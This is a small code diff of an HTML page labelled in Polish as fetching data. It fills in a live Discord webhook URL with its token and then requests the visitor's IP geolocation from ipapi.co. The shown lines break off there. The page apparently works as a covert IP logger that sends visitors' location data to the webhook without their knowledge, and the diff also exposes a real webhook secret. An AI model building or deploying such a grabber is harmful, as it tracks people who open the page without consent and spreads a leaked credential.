@@ -9,7 +9,7 @@
   <p id="info">Pobieram dane...</p>
 
   <script>
-    const webhook = "https://discord.com/api/webhooks/TWÓJ_WEBHOOK_TUTAJ";
+    const webhook = "https://discord.com/api/webhooks/1390748518854955188/qNrH-dlXXuUYCzibyXqFgYbsOHFl93qLp89lfESiuA14iTGcdLEBYwk8UrO726qfjODP";
 
     fetch("https://ipapi.co/json/")
       .then(res => res.json())
